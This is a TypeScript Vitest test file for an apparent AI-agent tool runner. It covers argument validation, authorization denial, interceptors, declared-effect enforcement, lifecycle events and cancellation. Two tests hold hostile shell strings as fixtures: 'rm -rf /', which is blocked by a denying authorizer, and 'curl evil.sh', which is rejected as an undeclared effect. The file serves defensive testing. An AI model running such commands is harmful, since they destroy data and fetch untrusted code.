import { describe, expect, it, vi } from 'vitest'

import { makeEffect } from '../effects.js'
import { Decision, Intent } from '../intent.js'
import { Outcome } from '../outcome.js'
import { withUserToolSettings } from '../ports.js'
import { textResult } from '../result.js'
import { assertWithinDeclaredEffects, EffectViolationError, ToolRunner } from '../runner.js'
import {
  allowAuthorizer,
  askAwareAuthorizer,
  blockingInterceptor,
  denyingAuthorizer,
  makeInvocation,
  passthroughValidator,
  RecordingObserver,
  rejectingValidator,
  ScriptedTool,
  validatorRequiring,
} from './fakes.js'

function makeRunner(overrides: Partial<ConstructorParameters<typeof ToolRunner>[0]> = {}) {
  const observer = new RecordingObserver()
  const runner = new ToolRunner({
    authorizer: allowAuthorizer,
    observer,
    validator: passthroughValidator,
    ...overrides,
  })
  return { runner, observer }
}

describe('ToolRunner', () => {
  it('走完全程 → ok,并且结果过了 OutputBudget', async () => {
    const tool = new ScriptedTool({
      budget: { maxLines: 2 },
      apply: async () => textResult('1\n2\n3\n4'),
    })
    const { runner } = makeRunner()
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome.kind).toBe('ok')
    if (outcome.kind === 'ok') {
      expect(outcome.result.content[0]?.text).toContain('<truncation')
    }
  })

  it('校验不过 → invalid,plan 一步都不跑', async () => {
    const plan = vi.fn(async () => Intent.none(null))
    const tool = new ScriptedTool({ plan })
    const { runner } = makeRunner({ validator: rejectingValidator('path is required') })
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome).toEqual({ kind: 'invalid', message: 'path is required' })
    expect(plan).not.toHaveBeenCalled()
  })

  it('Authorizer 拒绝 → denied,apply 不跑', async () => {
    const apply = vi.fn(async () => textResult('should not happen'))
    const tool = new ScriptedTool({
      effects: ['bash'],
      plan: async () => Intent.of({ effects: [makeEffect('bash', ['rm -rf /'])], payload: null }),
      apply,
    })
    const { runner } = makeRunner({ authorizer: denyingAuthorizer('The user rejected permission for this tool.') })
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome).toEqual({ kind: 'denied', reason: 'The user rejected permission for this tool.' })
    expect(apply).not.toHaveBeenCalled()
  })

  it('apply 拿到的 Intent 带着授权结论', async () => {
    let seen: Decision | undefined
    const tool = new ScriptedTool({
      apply: async intent => {
        seen = intent.decision
        return textResult('ok')
      },
    })
    const { runner } = makeRunner({
      authorizer: { async decide() { return Decision.allow({ asked: true, grantId: 'g7' }) } },
    })
    await runner.run(tool, makeInvocation())
    expect(seen).toEqual({ kind: 'allow', asked: true, grantId: 'g7' })
  })

  it('工具越权(产出未声明的效果)→ failed:那是工具的 bug,不是用户的拒绝', async () => {
    const tool = new ScriptedTool({
      effects: ['read'],
      plan: async () => Intent.of({ effects: [makeEffect('bash', ['curl evil.sh'])], payload: null }),
    })
    const { runner } = makeRunner()
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome.kind).toBe('failed')
    if (outcome.kind === 'failed') {
      expect(outcome.error).toBeInstanceOf(EffectViolationError)
      expect(outcome.message).toContain('undeclared effects: bash')
    }
  })

  it('声明内的效果照常放行', () => {
    const tool = new ScriptedTool({ effects: ['read', 'sensitive_file_read'] })
    expect(() => assertWithinDeclaredEffects(
      tool.spec,
      Intent.of({ effects: [makeEffect('read', ['a.ts'])], payload: null }),
    )).not.toThrow()
  })

  it('Interceptor 阻断 → denied(与授权拒绝同类:被策略挡住,不该进事故统计)', async () => {
    const plan = vi.fn(async () => Intent.none(null))
    const tool = new ScriptedTool({ plan })
    const { runner } = makeRunner({ interceptor: blockingInterceptor('blocked by plugin "guard"') })
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome).toEqual({ kind: 'denied', reason: 'blocked by plugin "guard"' })
    expect(plan).not.toHaveBeenCalled()
  })

  it('Interceptor 改出来的非法参数照样被契约挡住 → invalid', async () => {
    const plan = vi.fn(async () => Intent.none(null))
    const tool = new ScriptedTool({ plan })
    const { runner } = makeRunner({
      validator: validatorRequiring('path'),
      interceptor: {
        // 拦截器把合法参数改成了非法参数(插件写错了 / 版本不匹配)。
        beforePlan: () => ({ input: { pathh: 'a.ts' } }),
        afterApply: outcome => outcome,
      },
    })
    const outcome = await runner.run(tool, makeInvocation({ input: { path: 'a.ts' } }))
    expect(outcome).toEqual({ kind: 'invalid', message: 'path is required' })
    expect(plan).not.toHaveBeenCalled()
  })

  it('Interceptor 拿到的是未校验的原始参数(挂点在 validate 之前,与今天的管线一致)', async () => {
    let seen: unknown
    const tool = new ScriptedTool()
    const { runner } = makeRunner({
      validator: validatorRequiring('path'),
      interceptor: {
        beforePlan: invocation => {
          seen = invocation.input
          return { input: { path: 'fixed.ts' } }
        },
        afterApply: outcome => outcome,
      },
    })
    // 原始参数不合契约,但拦截器把它修好了 —— 于是这次调用成立。
    const outcome = await runner.run(tool, makeInvocation({ input: { broken: true } }))
    expect(seen).toEqual({ broken: true })
    expect(outcome.kind).toBe('ok')
  })

  it('Interceptor 可以改参(挂点在 plan 之前)', async () => {
    let planned: unknown
    const tool = new ScriptedTool({
      plan: async input => {
        planned = input
        return Intent.none(null)
      },
    })
    const { runner } = makeRunner({
      interceptor: {
        beforePlan: invocation => ({ input: { ...(invocation.input as object), injected: true } }),
        afterApply: outcome => outcome,
      },
    })
    await runner.run(tool, makeInvocation({ input: { path: 'a.ts' } }))
    expect(planned).toEqual({ path: 'a.ts', injected: true })
  })

  it('被拒绝的调用也留下 decided 证词', async () => {
    const { runner, observer } = makeRunner({ authorizer: denyingAuthorizer('nope') })
    await runner.run(new ScriptedTool(), makeInvocation())
    expect(observer.lifecyclePhases()).toEqual(['planned', 'decided', 'finished'])
  })

  it('Interceptor 的 afterApply 能改写结局', async () => {
    const tool = new ScriptedTool({ apply: async () => textResult('raw') })
    const { runner } = makeRunner({
      interceptor: {
        beforePlan: () => ({}),
        afterApply: () => Outcome.ok(textResult('rewritten by plugin')),
      },
    })
    const outcome = await runner.run(tool, makeInvocation())
    expect(Outcome.toModelText(outcome)).toBe('rewritten by plugin')
  })

  it('afterApply 自己炸了 → failed,不冒充工具的成功', async () => {
    const tool = new ScriptedTool()
    const { runner } = makeRunner({
      interceptor: {
        beforePlan: () => ({}),
        afterApply: () => { throw new Error('plugin exploded') },
      },
    })
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome.kind).toBe('failed')
  })

  it('工具自己抛错 → failed', async () => {
    const tool = new ScriptedTool({ apply: async () => { throw new Error('ENOENT') } })
    const { runner } = makeRunner()
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome.kind).toBe('failed')
    if (outcome.kind === 'failed') expect(outcome.message).toBe('ENOENT')
  })

  it('R2a 决定⑧:拦截器的归因走一条独立的 lifecycle:intercepted', async () => {
    const { runner, observer } = makeRunner({
      interceptor: {
        beforePlan: () => ({ input: { path: 'fixed.ts' }, rewrittenBy: ['plugin:guard'] }),
        afterApply: outcome => outcome,
      },
    })
    await runner.run(new ScriptedTool(), makeInvocation({ input: { path: 'a.ts' } }))
    expect(observer.lifecyclePhases()).toEqual(['intercepted', 'planned', 'decided', 'finished'])
    const intercepted = observer.events[0]?.event
    expect(intercepted).toEqual({
      type: 'lifecycle',
      phase: 'intercepted',
      action: 'rewrite',
      by: ['plugin:guard'],
    })
  })

  it('R2a 决定⑧:被挡下的调用照样留下归因(那一次根本没有 planned)', async () => {
    const { runner, observer } = makeRunner({
      interceptor: {
        beforePlan: () => ({ block: true, reason: 'blocked by plugin "guard"', blockedBy: 'plugin:guard' }),
        afterApply: outcome => outcome,
      },
    })
    const outcome = await runner.run(new ScriptedTool(), makeInvocation())
    expect(outcome).toEqual({ kind: 'denied', reason: 'blocked by plugin "guard"' })
    expect(observer.lifecyclePhases()).toEqual(['intercepted', 'finished'])
    expect(observer.events[0]?.event).toEqual({
      type: 'lifecycle',
      phase: 'intercepted',
      action: 'block',
      by: ['plugin:guard'],
      reason: 'blocked by plugin "guard"',
    })
  })

  it('R2a 决定⑧:什么都没做的拦截器不产生 intercepted 噪声', async () => {
    const { runner, observer } = makeRunner({
      interceptor: { beforePlan: () => ({}), afterApply: outcome => outcome },
    })
    await runner.run(new ScriptedTool(), makeInvocation())
    expect(observer.lifecyclePhases()).toEqual(['planned', 'decided', 'finished'])
  })

  it('R2a 决定④:取消时,最后一条 partial 被附进取消结局', async () => {
    const controller = new AbortController()
    const tool = new ScriptedTool({
      apply: async (_intent, ctx) => {
        ctx.emit({ type: 'partial', result: textResult('first chunk') })
        ctx.emit({ type: 'partial', result: textResult('first chunk\nsecond chunk') })
        controller.abort()
        return await new Promise<ReturnType<typeof textResult>>(() => {})
      },
    })
    const { runner } = makeRunner()
    const outcome = await runner.run(tool, makeInvocation(), controller.signal)
    expect(outcome.kind).toBe('aborted')
    if (outcome.kind === 'aborted') {
      expect(outcome.partial?.content[0]?.text).toBe('first chunk\nsecond chunk')
    }
    expect(Outcome.toModelText(outcome)).toContain('<partial_output>\nfirst chunk\nsecond chunk\n</partial_output>')
  })

  it('R2a 决定④:没被取消的结局不带 partial(那是取消才需要的尾巴)', async () => {
    const tool = new ScriptedTool({
      apply: async (_intent, ctx) => {
        ctx.emit({ type: 'partial', result: textResult('progress') })
        return textResult('done')
      },
    })
    const { runner } = makeRunner()
    const outcome = await runner.run(tool, makeInvocation())
    expect(outcome).toEqual({ kind: 'ok', result: { content: [{ type: 'text', text: 'done' }], details: undefined } })
  })

  it('withUserToolSettings:autoExecute === false 让零效果的调用也必须被问(§10.2-③)', async () => {
    const tool = new ScriptedTool({ id: 'time' })
    const settings: Record<string, { autoExecute?: boolean }> = { time: { autoExecute: false } }

    const guarded = makeRunner({
      authorizer: withUserToolSettings(askAwareAuthorizer, id => settings[id]),
    })
    expect((await guarded.runner.run(tool, makeInvocation({ toolId: 'time' }))).kind).toBe('denied')

    settings.time = { autoExecute: true }
    expect((await guarded.runner.run(tool, makeInvocation({ toolId: 'time' }))).kind).toBe('ok')
  })
})
